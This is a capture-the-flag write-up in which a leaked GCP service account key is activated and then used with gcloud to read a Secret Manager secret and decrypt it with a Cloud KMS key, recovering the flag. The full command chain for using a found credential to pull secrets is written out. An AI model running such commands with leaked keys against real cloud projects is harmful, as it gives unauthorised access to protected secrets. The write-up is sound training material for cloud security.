#### Challenge:

Found this service account key after the results of a pen test but we are running out of time and we are looking to increase the impact of our finding. Can you get some results so we can maximise our bounty, we know there is highly *secretive* material in their Cloud Project! [legacy.json](./legacy.json ":ignore")

---

#### Solution:

Using the provided `GCP` service account key, I tried to `gcloud secrets list`. It turned out there is one called `unused_data` but it was encrypted, so I also looked at `gcloud kms list`. There was a keyring with several kms keys, but after trying all of them, the `a-silver-key` revealed the flag:

```bash
gcloud auth activate-service-account --key-file ~/Downloads/legacy.json
gcloud secrets versions access "latest" --project ductf-lost-n-found --secret unused_data | base64 -d | gcloud kms decrypt --key=a-silver-key --keyring=wardens-locks --location=australia-southeast2 --project ductf-lost-n-found --ciphertext-file=- --plaintext-file=-
```

---

<details><summary>FLAG:</summary>

```
DUCTF{its_time_to_clean_up_your_service_account_permissions!}
```

</details>
<br/>
